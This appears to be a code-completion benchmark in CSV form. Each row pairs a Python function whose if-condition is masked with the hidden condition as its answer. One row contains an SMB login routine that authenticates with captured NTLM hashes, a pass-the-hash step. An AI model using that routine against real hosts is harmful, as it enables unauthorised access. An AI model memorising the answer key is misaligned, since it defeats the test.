4579,"def _addPending(self, path, reason, isDir=False):<tab>if path not in self.__pending:<tab><tab>self.__pending[path] = [Utils.DEFAULT_SLEEP_INTERVAL, isDir]<tab><tab>self.__pendingMinTime = 0<tab><tab><IF-STMT><tab><tab><tab>reason = [reason.maskname, reason.pathname]<tab><tab>logSys.log(<tab><tab><tab>logging.MSG,<tab><tab><tab>""Log absence detected (possibly rotation) for %s, reason: %s of %s"",<tab><tab><tab>path,<tab><tab><tab>*reason<tab><tab>)","if isinstance ( reason , pyinotify . Event ) :",147
4580,"def has_safe_repr(value):<tab>""""""Does the node have a safe representation?""""""<tab>if value is None or value is NotImplemented or value is Ellipsis:<tab><tab>return True<tab>if isinstance(value, (bool, int, long, float, complex, basestring, xrange, Markup)):<tab><tab>return True<tab>if isinstance(value, (tuple, list, set, frozenset)):<tab><tab>for item in value:<tab><tab><tab>if not has_safe_repr(item):<tab><tab><tab><tab>return False<tab><tab>return True<tab>elif isinstance(value, dict):<tab><tab>for key, value in value.iteritems():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab><tab>if not has_safe_repr(value):<tab><tab><tab><tab>return False<tab><tab>return True<tab>return False",if not has_safe_repr ( key ) :,192
4581,"def refund_balances(self):<tab>from liberapay.billing.transactions import refund_payin<tab>payins = self.get_refundable_payins()<tab>for exchange in payins:<tab><tab>balance = self.get_balance_in(exchange.amount.currency)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>amount = min(balance, exchange.refundable_amount)<tab><tab>status, e_refund = refund_payin(self.db, exchange, amount, self)<tab><tab>if status != ""succeeded"":<tab><tab><tab>raise TransferError(e_refund.note)",if balance == 0 :,146
4582,"def balanced_tokens_across_dcs(self, dcs):<tab>tokens = []<tab>current_dc = dcs[0]<tab>count = 0<tab>dc_count = 0<tab>for dc in dcs:<tab><tab><IF-STMT><tab><tab><tab>count += 1<tab><tab>else:<tab><tab><tab>new_tokens = [tk + (dc_count * 100) for tk in self.balanced_tokens(count)]<tab><tab><tab>tokens.extend(new_tokens)<tab><tab><tab>current_dc = dc<tab><tab><tab>count = 1<tab><tab><tab>dc_count += 1<tab>new_tokens = [tk + (dc_count * 100) for tk in self.balanced_tokens(count)]<tab>tokens.extend(new_tokens)<tab>return tokens",if dc == current_dc :,181
4583,"def get_logsource(self, category, product, service):<tab>""""""Return merged log source definition of all logosurces that match criteria across all Sigma conversion configurations in chain.""""""<tab>matching = list()<tab>for config in self:<tab><tab>for logsource in config.logsources:<tab><tab><tab>if logsource.matches(category, product, service):<tab><tab><tab><tab>matching.append(logsource)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>category, product, service = logsource.rewrite<tab>return SigmaLogsourceConfiguration(matching, self.defaultindex)",if logsource . rewrite is not None :,138
4584,"def fill_squares(self, loc, type):<tab>value = type<tab>for n in range(self.no_players):<tab><tab>self.map_data[loc[0]][loc[1]] = value<tab><tab><IF-STMT><tab><tab><tab>value = chr(ord(value) + 1)<tab><tab>loc = self.get_translate_loc(loc)","if type == ""0"" :",88
4585,"def _init_ti_table():<tab>global _ti_table<tab>_ti_table = []<tab>for fname, name in zip(kc.STRFNAMES, kc.STRNAMES):<tab><tab>seq = termcap.get(name)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>k = _name_to_key(fname)<tab><tab>if k:<tab><tab><tab>_ti_table.append((list(bytearray(seq)), k))",if not seq :,109
4586,"def OnDelete(self, event):<tab>with wx.MessageDialog(<tab><tab>self,<tab><tab>""Do you really want to delete the {} {}?"".format(<tab><tab><tab>self.getActiveEntity().name, self.entityName<tab><tab>),<tab><tab>""Confirm Delete"",<tab><tab>wx.YES | wx.NO | wx.ICON_QUESTION,<tab>) as dlg:<tab><tab>dlg.CenterOnParent()<tab><tab><IF-STMT><tab><tab><tab>self.DoDelete(self.getActiveEntity())<tab><tab><tab>self.refreshEntityList()<tab><tab><tab>wx.PostEvent(<tab><tab><tab><tab>self.entityChoices, wx.CommandEvent(wx.wxEVT_COMMAND_CHOICE_SELECTED)<tab><tab><tab>)",if dlg . ShowModal ( ) == wx . ID_YES :,179
4587,"def _add(self, queue):<tab>if not queue.routing_key:<tab><tab><IF-STMT><tab><tab><tab>queue.exchange = self.default_exchange<tab><tab>queue.routing_key = self.default_routing_key<tab>if self.ha_policy:<tab><tab>if queue.queue_arguments is None:<tab><tab><tab>queue.queue_arguments = {}<tab><tab>self._set_ha_policy(queue.queue_arguments)<tab>if self.max_priority is not None:<tab><tab>if queue.queue_arguments is None:<tab><tab><tab>queue.queue_arguments = {}<tab><tab>self._set_max_priority(queue.queue_arguments)<tab>self[queue.name] = queue<tab>return queue","if queue . exchange is None or queue . exchange . name == """" :",187
4588,"def ParsePlacemark(self, node):<tab>ret = Placemark()<tab>for child in node.childNodes:<tab><tab><IF-STMT><tab><tab><tab>ret.name = self.ExtractText(child)<tab><tab>if child.nodeName == ""Point"" or child.nodeName == ""LineString"":<tab><tab><tab>ret.coordinates = self.ExtractCoordinates(child)<tab>return ret","if child . nodeName == ""name"" :",94
4589,"def find_library_nt(name):<tab># modified from ctypes.util<tab># ctypes.util.find_library just returns first result he found<tab># but we want to try them all<tab># because on Windows, users may have both 32bit and 64bit version installed<tab>results = []<tab>for directory in os.environ[""PATH""].split(os.pathsep):<tab><tab>fname = os.path.join(directory, name)<tab><tab>if os.path.isfile(fname):<tab><tab><tab>results.append(fname)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>fname = fname + "".dll""<tab><tab>if os.path.isfile(fname):<tab><tab><tab>results.append(fname)<tab>return results","if fname . lower ( ) . endswith ( "".dll"" ) :",174
4590,"def _calc_freq(item):<tab>try:<tab><tab>if ao_index is not None and ro_index is not None:<tab><tab><tab>ao = sum([int(x) for x in item.split("":"")[ao_index].split("","")])<tab><tab><tab>ro = int(item.split("":"")[ro_index])<tab><tab><tab>freq = ao / float(ao + ro)<tab><tab><IF-STMT><tab><tab><tab>freq = float(item.split("":"")[af_index])<tab><tab>else:<tab><tab><tab>freq = 0.0<tab>except (IndexError, ValueError, ZeroDivisionError):<tab><tab>freq = 0.0<tab>return freq",elif af_index is not None :,151
4591,def poll_kafka(self):<tab>while True:<tab><tab>val = self.do_poll()<tab><tab><IF-STMT><tab><tab><tab>yield self._emit(val)<tab><tab>else:<tab><tab><tab>yield gen.sleep(self.poll_interval)<tab><tab>if self.stopped:<tab><tab><tab>break<tab>self._close_consumer(),if val :,85
4592,"def resolve_list_field(parent, args, ctx, info):<tab>if ""param"" in args:<tab><tab>return ""SUCCESS-[{}]"".format(<tab><tab><tab>str(args[""param""])<tab><tab><tab><IF-STMT><tab><tab><tab>else ""-"".join([str(item) for item in args[""param""]])<tab><tab>)<tab>return ""SUCCESS""","if not isinstance ( args [ ""param"" ] , list )",88
4593,"def login_hash(self, host, username, ntlmhash, domain):<tab>lmhash, nthash = ntlmhash.split("":"")<tab>try:<tab><tab>self.smbconn[host] = SMBConnection(host, host, sess_port=445, timeout=2)<tab><tab>self.smbconn[host].login(username, """", domain, lmhash=lmhash, nthash=nthash)<tab><tab><IF-STMT><tab><tab><tab>color(""[+] Guest session established on %s..."" % (host))<tab><tab>else:<tab><tab><tab>color(""[+] User session establishd on %s..."" % (host))<tab><tab>return True<tab>except Exception as e:<tab><tab>color(""[!] Authentication error occured"")<tab><tab>color(""[!]"", e)<tab><tab>return False",if self . smbconn [ host ] . isGuestSession ( ) > 0 :,196
4594,"def _add(self, queue):<tab>if not queue.routing_key:<tab><tab>if queue.exchange is None or queue.exchange.name == """":<tab><tab><tab>queue.exchange = self.default_exchange<tab><tab>queue.routing_key = self.default_routing_key<tab>if self.ha_policy:<tab><tab><IF-STMT><tab><tab><tab>queue.queue_arguments = {}<tab><tab>self._set_ha_policy(queue.queue_arguments)<tab>if self.max_priority is not None:<tab><tab>if queue.queue_arguments is None:<tab><tab><tab>queue.queue_arguments = {}<tab><tab>self._set_max_priority(queue.queue_arguments)<tab>self[queue.name] = queue<tab>return queue",if queue . queue_arguments is None :,187
4595,"def safe_delete_pod(self, jobid, ignore_not_found=True):<tab>import kubernetes.client<tab>body = kubernetes.client.V1DeleteOptions()<tab>try:<tab><tab>self.kubeapi.delete_namespaced_pod(jobid, self.namespace, body=body)<tab>except kubernetes.client.rest.ApiException as e:<tab><tab><IF-STMT><tab><tab><tab># Can't find the pod. Maybe it's already been<tab><tab><tab># destroyed. Proceed with a warning message.<tab><tab><tab>logger.warning(<tab><tab><tab><tab>""[WARNING] 404 not found when trying to delete the pod: {jobid}\n""<tab><tab><tab><tab>""[WARNING] Ignore this error\n"".format(jobid=jobid)<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>raise e",if e . status == 404 and ignore_not_found :,194
4596,"def __init__(self, element, spec):<tab>Extension.__init__(self, element, spec)<tab>self.spec = spec<tab>self.number = tuple(map(int, element.attrib[""number""].split(""."")))<tab>self.api = element.attrib[""api""]<tab># not every spec has a ._remove member, but there shouldn't be a remove<tab># tag without that member, if there is, blame me!<tab>for removed in chain.from_iterable(element.findall(""remove"")):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>data = {""enum"": spec.enums, ""command"": spec.commands}[removed.tag]<tab><tab>try:<tab><tab><tab>spec.add_remove(self.api, self.number, data[removed.attrib[""name""]])<tab><tab>except KeyError:<tab><tab><tab>pass  # TODO","if removed . tag == ""type"" :",199
4597,"def _convert_raw_source(self, source, languages):<tab>for row in source:<tab><tab>example = self._read_example(row)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>for col, lang in zip(self.language_columns, languages):<tab><tab><tab>example[col] = lang<tab><tab>yield example",if example is None :,81
4598,"def check_engine(engine):<tab>if engine == ""auto"":<tab><tab>if pa is not None:<tab><tab><tab>return ""pyarrow""<tab><tab><IF-STMT>  # pragma: no cover<tab><tab><tab>return ""fastparquet""<tab><tab>else:  # pragma: no cover<tab><tab><tab>raise RuntimeError(""Please install either pyarrow or fastparquet."")<tab>elif engine == ""pyarrow"":<tab><tab>if pa is None:  # pragma: no cover<tab><tab><tab>raise RuntimeError(""Please install pyarrow fisrt."")<tab><tab>return engine<tab>elif engine == ""fastparquet"":<tab><tab>if fastparquet is None:  # pragma: no cover<tab><tab><tab>raise RuntimeError(""Please install fastparquet first."")<tab><tab>return engine<tab>else:  # pragma: no cover<tab><tab>raise RuntimeError(""Unsupported engine {} to read parquet."".format(engine))",elif fastparquet is not None :,187
4599,"def TryMerge(self, d):<tab>while 1:<tab><tab>tt = d.getVarInt32()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>if tt == 18:<tab><tab><tab>self.set_value(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 29:<tab><tab><tab>self.set_flags(d.get32())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 12 :,126
4600,"def handle(self, request):<tab>try:<tab><tab>if request.message.question[0].rdtype == dns.rdatatype.IXFR:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>text = ixfr<tab><tab><tab>else:<tab><tab><tab><tab>text = retry_tcp_ixfr<tab><tab><tab><tab>self.did_truncation = True<tab><tab>else:<tab><tab><tab>text = axfr<tab><tab>r = dns.message.from_text(text, one_rr_per_rrset=True, origin=self.origin)<tab><tab>r.id = request.message.id<tab><tab>return r<tab>except Exception:<tab><tab>pass",if self . did_truncation :,159
4601,"def read_kvfile_todict(file):<tab>if not os.path.isfile(file):<tab><tab>return {}<tab>ret = {}<tab>with open(file, ""r"") as FH:<tab><tab>for l in FH.readlines():<tab><tab><tab>l = l.strip()<tab><tab><tab># l = l.strip().decode('utf8')<tab><tab><tab><IF-STMT><tab><tab><tab><tab>(k, v) = re.match(r""(\S*)\s*(.*)"", l).group(1, 2)<tab><tab><tab><tab>k = re.sub(""____"", "" "", k)<tab><tab><tab><tab>ret[k] = v<tab>return ret",if l :,153
4602,"def wrapper(*args, **kwargs):<tab>with capture_logs() as logs:<tab><tab>try:<tab><tab><tab>function(*args, **kwargs)<tab><tab>except Exception:  # pragma: no cover<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print(""%i errors logged:"" % len(logs), file=sys.stderr)<tab><tab><tab><tab>for message in logs:<tab><tab><tab><tab><tab>print(message, file=sys.stderr)<tab><tab><tab>raise<tab><tab>else:<tab><tab><tab>if logs:  # pragma: no cover<tab><tab><tab><tab>for message in logs:<tab><tab><tab><tab><tab>print(message, file=sys.stderr)<tab><tab><tab><tab>raise AssertionError(""%i errors logged"" % len(logs))",if logs :,168
4603,"def batchSites(self, sites):<tab>i = 0<tab>res = list()<tab>siteList = list()<tab>for site in sites:<tab><tab>if i >= self.opts[""_maxthreads""]:<tab><tab><tab>data = self.threadSites(siteList)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return res<tab><tab><tab>for ret in list(data.keys()):<tab><tab><tab><tab>if data[ret]:<tab><tab><tab><tab><tab># bucket:filecount<tab><tab><tab><tab><tab>res.append(f""{ret}:{data[ret]}"")<tab><tab><tab>i = 0<tab><tab><tab>siteList = list()<tab><tab>siteList.append(site)<tab><tab>i += 1<tab>return res",if data is None :,168
4604,"def datagram_received(self, data, addr):<tab>""""""Handle data from ``addr``.""""""<tab>if self.buffer and addr in self.buffer:<tab><tab>data = self.buffer.pop(addr) + data<tab>while data:<tab><tab>idx = data.find(self.separator)<tab><tab>if idx >= 0:  # we have a full message<tab><tab><tab>idx += len(self.separator)<tab><tab><tab>chunk, data = data[:idx], data[idx:]<tab><tab><tab>self.response(chunk, addr)<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.buffer = {}<tab><tab><tab>self.buffer[addr] = data<tab><tab><tab>data = None",if self . buffer is None :,168
4605,"def tearDown(self):<tab>if self.node:<tab><tab><IF-STMT><tab><tab><tab>with patch(""golem.task.taskserver.TaskServer.quit""):<tab><tab><tab><tab>self.node.client.quit()<tab><tab>if self.node._db:<tab><tab><tab>self.node._db.close()<tab>super().tearDown()",if self . node . client :,84
4606,"def _to_sentences(self, lines):<tab>text = """"<tab>sentence_objects = []<tab>for line in lines:<tab><tab><IF-STMT><tab><tab><tab>if text:<tab><tab><tab><tab>sentences = self.tokenize_sentences(text)<tab><tab><tab><tab>sentence_objects += map(self._to_sentence, sentences)<tab><tab><tab>sentence_objects.append(line)<tab><tab><tab>text = """"<tab><tab>else:<tab><tab><tab>text += "" "" + line<tab>text = text.strip()<tab>if text:<tab><tab>sentences = self.tokenize_sentences(text)<tab><tab>sentence_objects += map(self._to_sentence, sentences)<tab>return sentence_objects","if isinstance ( line , Sentence ) :",164
4607,"def _cloneComponentValues(self, myClone, cloneValueFlag):<tab>idx = 0<tab>l = len(self._componentValues)<tab>while idx < l:<tab><tab>c = self._componentValues[idx]<tab><tab>if c is not None:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>myClone.setComponentByPosition(<tab><tab><tab><tab><tab>idx, c.clone(cloneValueFlag=cloneValueFlag)<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>myClone.setComponentByPosition(idx, c.clone())<tab><tab>idx = idx + 1","if isinstance ( c , base . AbstractConstructedAsn1Item ) :",154
4608,"def split_quality(quality):<tab>anyQualities = []<tab>bestQualities = []<tab>for curQual in Quality.qualityStrings.keys():<tab><tab>if curQual & quality:<tab><tab><tab>anyQualities.append(curQual)<tab><tab><IF-STMT><tab><tab><tab>bestQualities.append(curQual)<tab>return sorted(anyQualities), sorted(bestQualities)",if curQual << 16 & quality :,109
4609,"def make_pattern(wtree):<tab>subpattern = []<tab>for part in wtree[1:-1]:<tab><tab><IF-STMT><tab><tab><tab>part = make_pattern(part)<tab><tab>elif wtree[0] != """":<tab><tab><tab>for c in part:<tab><tab><tab><tab># Meta-characters cannot be quoted<tab><tab><tab><tab>if c in special_chars:<tab><tab><tab><tab><tab>raise GlobError()<tab><tab>subpattern.append(part)<tab>return """".join(subpattern)","if isinstance ( part , list ) :",123
4610,"def insert_not(self, aList):<tab>'''Change ""!"" to ""not"" except before ""=""'''<tab>i = 0<tab>while i < len(aList):<tab><tab>if self.is_string_or_comment(aList, i):<tab><tab><tab>i = self.skip_string_or_comment(aList, i)<tab><tab><IF-STMT><tab><tab><tab>aList[i : i + 1] = list(""not "")<tab><tab><tab>i += 4<tab><tab>else:<tab><tab><tab>i += 1","elif aList [ i ] == ""!"" and not self . match ( aList , i + 1 , ""="" ) :",142
4611,"def _concretize(self, n_cls, t1, t2, join_or_meet, translate):<tab>ptr_class = self._pointer_class()<tab>if n_cls is ptr_class:<tab><tab>if isinstance(t1, ptr_class) and isinstance(t2, ptr_class):<tab><tab><tab># we need to merge them<tab><tab><tab>return ptr_class(join_or_meet(t1.basetype, t2.basetype, translate))<tab><tab>if isinstance(t1, ptr_class):<tab><tab><tab>return t1<tab><tab><IF-STMT><tab><tab><tab>return t2<tab><tab>else:<tab><tab><tab># huh?<tab><tab><tab>return ptr_class(BottomType())<tab>return n_cls()","elif isinstance ( t2 , ptr_class ) :",181
4612,"def pre_validate(self, form):<tab>if self.data:<tab><tab>values = list(c[0] for c in self.choices)<tab><tab>for d in self.data:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(<tab><tab><tab><tab><tab>self.gettext(""'%(value)s' is not a valid choice for this field"")<tab><tab><tab><tab><tab>% dict(value=d)<tab><tab><tab><tab>)",if d not in values :,106
4613,"def frontend_visible_config(config_dict):<tab>visible_dict = {}<tab>for name in CLIENT_WHITELIST:<tab><tab>if name.lower().find(""secret"") >= 0:<tab><tab><tab>raise Exception(""Cannot whitelist secrets: %s"" % name)<tab><tab><IF-STMT><tab><tab><tab>visible_dict[name] = config_dict.get(name, None)<tab><tab>if ""ENTERPRISE_LOGO_URL"" in config_dict:<tab><tab><tab>visible_dict[""BRANDING""] = visible_dict.get(""BRANDING"", {})<tab><tab><tab>visible_dict[""BRANDING""][""logo""] = config_dict[""ENTERPRISE_LOGO_URL""]<tab>return visible_dict",if name in config_dict :,171
4614,"def listdir(self, path=None):<tab>from azure.storage.blob import Blob<tab>dir_path = normalize_storage_path(self._append_path_to_prefix(path))<tab>if dir_path:<tab><tab>dir_path += ""/""<tab>items = list()<tab>for blob in self.client.list_blobs(self.container, prefix=dir_path, delimiter=""/""):<tab><tab><IF-STMT><tab><tab><tab>items.append(self._strip_prefix_from_path(blob.name, dir_path))<tab><tab>else:<tab><tab><tab>items.append(<tab><tab><tab><tab>self._strip_prefix_from_path(<tab><tab><tab><tab><tab>blob.name[: blob.name.find(""/"", len(dir_path))], dir_path<tab><tab><tab><tab>)<tab><tab><tab>)<tab>return items",if type ( blob ) == Blob :,198
4615,"def diff(self, resources):<tab>model = self.manager.resource_type<tab>for r in resources:<tab><tab>hlabels = self.resolve_labels(r[""projectId""])<tab><tab>if not hlabels:<tab><tab><tab>continue<tab><tab>delta = False<tab><tab>rlabels = r.get(""labels"", {})<tab><tab>for k, v in hlabels.items():<tab><tab><tab>if k not in rlabels or rlabels[k] != v:<tab><tab><tab><tab>delta = True<tab><tab>if not delta:<tab><tab><tab>continue<tab><tab>rlabels = dict(rlabels)<tab><tab>rlabels.update(hlabels)<tab><tab><IF-STMT><tab><tab><tab>yield (""update"", model.get_label_params(r, rlabels))",if delta :,176
4616,"def favorite(id):<tab>note = Note.query.get_or_404(id)<tab>if current_user != note.author:<tab><tab>abort(403)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>note.is_favorite = True<tab><tab><tab>note.updated_date = datetime.utcnow()<tab><tab><tab>db.session.commit()<tab><tab><tab>flash(""Note marked as favorite"")<tab><tab>else:<tab><tab><tab>note.is_favorite = False<tab><tab><tab>note.updated_date = datetime.utcnow()<tab><tab><tab>db.session.commit()<tab><tab><tab>flash(""Note removed as favorite"")<tab><tab>return redirect(request.referrer)",if not note . is_favorite :,163
4617,"def enter_standby_instances(self, group_name, instance_ids, should_decrement):<tab>group = self.autoscaling_groups[group_name]<tab>original_size = group.desired_capacity<tab>standby_instances = []<tab>for instance_state in group.instance_states:<tab><tab><IF-STMT><tab><tab><tab>instance_state.lifecycle_state = ""Standby""<tab><tab><tab>standby_instances.append(instance_state)<tab>if should_decrement:<tab><tab>group.desired_capacity = group.desired_capacity - len(instance_ids)<tab>group.set_desired_capacity(group.desired_capacity)<tab>return standby_instances, original_size, group.desired_capacity",if instance_state . instance . id in instance_ids :,182
4618,"def _child_complete_hook(self, child_task):<tab>if child_task.task_spec == self.main_child_task_spec or self._should_cancel(<tab><tab>child_task.task_spec<tab>):<tab><tab>for sibling in child_task.parent.children:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if sibling.task_spec == self.main_child_task_spec or (<tab><tab><tab><tab><tab>isinstance(sibling.task_spec, BoundaryEvent)<tab><tab><tab><tab><tab>and not sibling._is_finished()<tab><tab><tab><tab>):<tab><tab><tab><tab><tab>sibling.cancel()<tab><tab>for t in child_task.workflow._get_waiting_tasks():<tab><tab><tab>t.task_spec._update(t)",if sibling != child_task :,183
4619,"def extract_groups(self, text: str, language_code: str):<tab>previous = None<tab>group = 1<tab>groups = []<tab>words = []<tab>ignored = IGNORES.get(language_code, {})<tab>for word in NON_WORD.split(text):<tab><tab>if not word:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>if previous == word:<tab><tab><tab><tab>group += 1<tab><tab><tab>elif group > 1:<tab><tab><tab><tab>groups.append(group)<tab><tab><tab><tab>words.append(previous)<tab><tab><tab><tab>group = 1<tab><tab>previous = word<tab>if group > 1:<tab><tab>groups.append(group)<tab><tab>words.append(previous)<tab>return groups, words",if word not in ignored and len ( word ) >= 2 :,187
4620,"def runTest(self):<tab>""""""This function will call api providing list of op_class""""""<tab>if self.is_positive_test:<tab><tab>response = indexes_utils.api_create_index_get_op_class(self)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>with patch(<tab><tab><tab><tab>self.mock_data[""function_name""],<tab><tab><tab><tab>side_effect=eval(self.mock_data[""return_value""]),<tab><tab><tab>):<tab><tab><tab><tab>response = indexes_utils.api_create_index_get_op_class(self)<tab>indexes_utils.assert_status_code(self, response)",if self . mocking_required :,160
4621,"def fn(value=None):<tab>for i in [-1, 0, 1, 2, 3, 4]:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>elif i == 0:<tab><tab><tab>yield 0<tab><tab>elif i == 1:<tab><tab><tab>yield 1<tab><tab><tab>i = 0<tab><tab><tab>yield value<tab><tab><tab>yield 2<tab><tab>else:<tab><tab><tab>try:<tab><tab><tab><tab>v = i / value<tab><tab><tab>except:<tab><tab><tab><tab>v = i<tab><tab><tab>yield v",if i < 0 :,127
4622,"def _update(self, flag):<tab>self._modified = False<tab>self._index = {}<tab>try:<tab><tab>f = _io.open(self._dirfile, ""r"", encoding=""Latin-1"")<tab>except OSError:<tab><tab><IF-STMT><tab><tab><tab>raise<tab><tab>self._modified = True<tab>else:<tab><tab>with f:<tab><tab><tab>for line in f:<tab><tab><tab><tab>line = line.rstrip()<tab><tab><tab><tab>key, pos_and_siz_pair = _ast.literal_eval(line)<tab><tab><tab><tab>key = key.encode(""Latin-1"")<tab><tab><tab><tab>self._index[key] = pos_and_siz_pair","if flag not in ( ""c"" , ""n"" ) :",172
4623,"def _network_connections_in_results(data):<tab>for plugin_name, plugin_result in data.iteritems():<tab><tab>if plugin_result[""status""] == ""error"":<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if ""connections"" in plugin_result[""device""]:<tab><tab><tab>for conn in plugin_result[""device""][""connections""]:<tab><tab><tab><tab>if conn[""connection_type""] == ConnectionType.network.name:<tab><tab><tab><tab><tab>return True<tab>return False","if ""device"" not in plugin_result :",126
4624,"def close(self) -> None:<tab>""""""Stop accepting writes and write file, if needed.""""""<tab>if not self._io:<tab><tab>raise Exception(""FileAvoidWrite does not support empty files."")<tab>buf = self.getvalue()<tab>self._io.close()<tab>try:<tab><tab>with open(self._path, encoding=""utf-8"") as old_f:<tab><tab><tab>old_content = old_f.read()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return<tab>except OSError:<tab><tab>pass<tab>with open(self._path, ""w"", encoding=""utf-8"") as f:<tab><tab>f.write(buf)",if old_content == buf :,157
4625,"def _extract_changes(doc_map, changes, read_time):<tab>deletes = []<tab>adds = []<tab>updates = []<tab>for name, value in changes.items():<tab><tab><IF-STMT><tab><tab><tab>if name in doc_map:<tab><tab><tab><tab>deletes.append(name)<tab><tab>elif name in doc_map:<tab><tab><tab>if read_time is not None:<tab><tab><tab><tab>value.read_time = read_time<tab><tab><tab>updates.append(value)<tab><tab>else:<tab><tab><tab>if read_time is not None:<tab><tab><tab><tab>value.read_time = read_time<tab><tab><tab>adds.append(value)<tab>return (deletes, adds, updates)",if value == ChangeType . REMOVED :,173
4626,"def preprocess(<tab>self,<tab>X: DataFrame,<tab>is_train=False,<tab>vect_max_features=1000,<tab>model_specific_preprocessing=False,):<tab>X = super().preprocess(X=X)<tab>if (<tab><tab>model_specific_preprocessing<tab>):  # This is hack to work-around pre-processing caching in bagging/stacker models<tab><tab><IF-STMT><tab><tab><tab>feature_types = self._get_types_of_features(X)<tab><tab><tab>X = self.preprocess_train(X, feature_types, vect_max_features)<tab><tab>else:<tab><tab><tab>X = self.pipeline.transform(X)<tab>return X",if is_train :,167
4627,"def setup_child(self, child):<tab>child.parent = self<tab>if self.document:<tab><tab>child.document = self.document<tab><tab><IF-STMT><tab><tab><tab>child.source = self.document.current_source<tab><tab>if child.line is None:<tab><tab><tab>child.line = self.document.current_line",if child . source is None :,84
4628,"def _compute_early_outs(self, quotas):<tab>for q in quotas:<tab><tab><IF-STMT><tab><tab><tab>self.results[q] = Quota.AVAILABILITY_ORDERED, 0<tab><tab>elif q.size is None:<tab><tab><tab>self.results[q] = Quota.AVAILABILITY_OK, None<tab><tab>elif q.size == 0:<tab><tab><tab>self.results[q] = Quota.AVAILABILITY_GONE, 0",if q . closed and not self . _ignore_closed :,118
4629,"def parse_function(self, l):<tab>bracket = l.find(""("")<tab>fname = l[8:bracket]<tab>if self.properties:<tab><tab><IF-STMT><tab><tab><tab>self.props[fname] = 1<tab><tab><tab>self.propget[fname] = 1<tab><tab>elif self.properties[0] == ""propput"":<tab><tab><tab>self.props[fname] = 1<tab><tab><tab>self.propput[fname] = 1<tab><tab>else:<tab><tab><tab>self.functions[fname] = 1<tab>self.properties = None","if self . properties [ 0 ] == ""propget"" :",139
4630,def SetHelpListButtonStates(self):<tab>if self.listHelp.size() < 1:  # no entries in list<tab><tab>self.buttonHelpListEdit.config(state=DISABLED)<tab><tab>self.buttonHelpListRemove.config(state=DISABLED)<tab>else:  # there are some entries<tab><tab><IF-STMT>  # there currently is a selection<tab><tab><tab>self.buttonHelpListEdit.config(state=NORMAL)<tab><tab><tab>self.buttonHelpListRemove.config(state=NORMAL)<tab><tab>else:  # there currently is not a selection<tab><tab><tab>self.buttonHelpListEdit.config(state=DISABLED)<tab><tab><tab>self.buttonHelpListRemove.config(state=DISABLED),if self . listHelp . curselection ( ) :,174
4631,"def param_names() -> FrozenSet[Tuple[str, str]]:<tab>""""""Returns all module and parameter names as a set of pairs.""""""<tab>out = []<tab>params = current_frame().params<tab>for mod_name, bundle in params.items():<tab><tab><IF-STMT><tab><tab><tab># TODO(tomhennigan) Fix broken user code and remove this warning.<tab><tab><tab>warnings.warn(f""Invalid entry {mod_name!r} in params {params}"")<tab><tab><tab>continue<tab><tab>for name in bundle:<tab><tab><tab>out.append((mod_name, name))<tab>return frozenset(out)","if not isinstance ( bundle , Mapping ) :",150
4632,"def _classify_volume(self, ctxt, volumes):<tab>normal_volumes = []<tab>replica_volumes = []<tab>for v in volumes:<tab><tab>volume_type = self._get_volume_replicated_type(ctxt, v)<tab><tab><IF-STMT><tab><tab><tab>replica_volumes.append(v)<tab><tab>else:<tab><tab><tab>normal_volumes.append(v)<tab>return normal_volumes, replica_volumes","if volume_type and v . status == ""available"" :",113
4633,"def undump_descriptions_of_all_objects(inf):<tab>d = {}<tab>for l in inf:<tab><tab>dash = l.find(""-"")<tab><tab>if dash == -1:<tab><tab><tab>raise l<tab><tab>mo = NRE.search(l)<tab><tab><IF-STMT><tab><tab><tab>typstr = l[dash + 1 : mo.start(0)]<tab><tab><tab>num = int(mo.group(0))<tab><tab><tab>if str(num) != mo.group(0):<tab><tab><tab><tab>raise mo.group(0)<tab><tab>else:<tab><tab><tab>typstr = l[dash + 1 :]<tab><tab><tab>num = None<tab><tab>d[l[:dash]] = (<tab><tab><tab>typstr,<tab><tab><tab>num,<tab><tab>)<tab>return d",if mo :,187
4634,"def _real_len(self, s):<tab>s_len = 0<tab>in_esc = False<tab>prev = "" ""<tab>for c in replace_all({""\0+"": """", ""\0-"": """", ""\0^"": """", ""\1"": """", ""\t"": "" ""}, s):<tab><tab><IF-STMT><tab><tab><tab>if c == ""m"":<tab><tab><tab><tab>in_esc = False<tab><tab>else:<tab><tab><tab>if c == ""["" and prev == ""\033"":<tab><tab><tab><tab>in_esc = True<tab><tab><tab><tab>s_len -= 1  # we counted prev when we shouldn't have<tab><tab><tab>else:<tab><tab><tab><tab>s_len += self._display_len(c)<tab><tab>prev = c<tab>return s_len",if in_esc :,177
